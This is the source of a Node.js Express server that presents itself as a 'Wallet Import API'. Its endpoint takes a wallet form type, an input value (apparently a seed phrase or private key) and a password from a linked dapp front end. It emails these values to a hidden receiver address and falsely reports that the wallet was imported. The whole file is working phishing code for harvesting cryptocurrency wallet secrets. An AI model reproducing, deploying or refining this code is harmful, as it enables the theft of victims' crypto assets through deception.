require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// CORS Options
const corsOptions = {
  origin: 'https://dappify.pages.dev',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: false
};

// Middleware
app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Root route
app.get('/', (req, res) => {
  res.send('Wallet Import API is running');
});

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Verify email configuration
transporter.verify((error, success) => {
  if (error) {
    console.error('Error verifying email transporter:', error);
  } else {
    console.log('Server is ready to send emails');
  }
});

// Enhanced email template
const createEmailTemplate = (data) => {
  return `
    <div style="font-family: 'Montserrat', Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f5f7ff; border-radius: 8px;">
      <div style="background: #4361ee; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
        <h1 style="color: white; margin: 0;">Wallet Import Notification</h1>
      </div>
      
      <div style="background: white; padding: 30px; border-radius: 0 0 8px 8px;">
        <h2 style="color: #4361ee; margin-top: 0;">New Wallet Import</h2>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
          <p style="margin: 0; font-weight: 600;">Import Type: <span style="color: #4361ee;">${data.form_type}</span></p>
          <p style="margin: 5px 0 0; font-size: 14px; color: #6c757d;">Received at: ${new Date().toLocaleString()}</p>
        </div>
        
        <div style="margin-bottom: 20px;">
          <h3 style="color: #212529; font-size: 16px; margin-bottom: 10px;">Details:</h3>
          <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; font-family: monospace; word-wrap: break-word;">
            ${data.input_value}
          </div>
        </div>
        
        ${data.password ? `
        <div style="margin-bottom: 20px;">
          <h3 style="color: #212529; font-size: 16px; margin-bottom: 10px;">Password:</h3>
          <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; font-family: monospace;">
            ${data.password}
          </div>
        </div>
        ` : ''}
        
        <div style="text-align: center; margin-top: 30px;">
          <a href="#" style="display: inline-block; padding: 12px 24px; background: #4361ee; color: white; text-decoration: none; border-radius: 6px; font-weight: 600;">
            View in Dashboard
          </a>
        </div>
      </div>
      
      <div style="text-align: center; margin-top: 20px; color: #6c757d; font-size: 12px;">
        <p>This is an automated message. Please do not reply.</p>
      </div>
    </div>
  `;
};

// API endpoint
app.post('/api/import-wallet', async (req, res) => {
  try {
    const { form_type, input_value, password } = req.body;

    if (!form_type || !input_value) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields' 
      });
    }

    const mailOptions = {
      from: `"Wallet System" <${process.env.EMAIL_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      subject: `New Wallet Import - ${form_type}`,
      html: createEmailTemplate({ form_type, input_value, password })
    };

    await transporter.sendMail(mailOptions);
    
    res.status(200).json({ 
      success: true,
      message: 'Wallet imported successfully' 
    });
  } catch (error) {
    console.error('Error processing wallet import:', error);
    res.status(500).json({ 
      success: false,
      error: 'Failed to process wallet import' 
    });
  }
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});


// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
